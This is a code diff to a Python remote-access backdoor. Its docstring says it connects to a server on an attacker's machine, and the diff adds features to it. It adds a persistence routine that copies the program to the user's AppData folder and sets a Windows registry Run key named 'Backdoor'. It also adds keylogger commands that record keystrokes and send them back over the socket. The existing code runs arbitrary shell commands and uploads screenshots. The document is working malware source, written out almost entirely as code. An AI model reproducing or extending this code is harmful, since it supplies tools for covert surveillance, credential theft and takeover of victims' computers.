@@ -5,8 +5,22 @@
     Connect to the server running on attacker machine.
 """
 
-import socket, subprocess, os
+import socket, subprocess, os, sys, threading, shutil
 import pyautogui
+import keylogger
+
+
+def persist():
+    file_location = os.environ["appdata"] + "\\WindowsBackdoor.exe"
+    try:
+        if not os.path.exists(file_location):
+            shutil.copyfile(sys.executable, file_location)
+            subprocess.call(f"reg add HkCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d '{file_location}'", shell=True)
+            s.send("[+] Successfully created persistence.")
+        else:
+            s.send("[!] Persistence already exists.")
+    except:
+        s.send("[-] Unable to create persistence.")
 
 def download_file(filename):
     with open(filename, "wb") as file:
@@ -59,11 +73,29 @@ def shell():
             upload_file("screenshot.png")
             os.remove("screenshot.png")
 
+        elif command[:12] == "keylog start":
+            keylog = keylogger.Keylogger()
+            t = threading.Thread(target=keylog.start)
+            t.start()
+            s.send("[+] Keylogger started")
+
+        elif command[:11] == "keylog dump":
+            logs = keylog.read_logs()
+            s.send(logs)
+
+        elif command[:11] == "keylog stop":
+            keylogger.self_destruct()
+            t.join()
+            s.send("[+] Keylogger stopped")
+
+        elif command == "persistence":
+            persist()
+
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                        stderr=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
-            s.send(result) # result contain bytes, so no need to encode it
+            s.send(result)  # result contain bytes, so no need to encode it
 
     s.close()
 
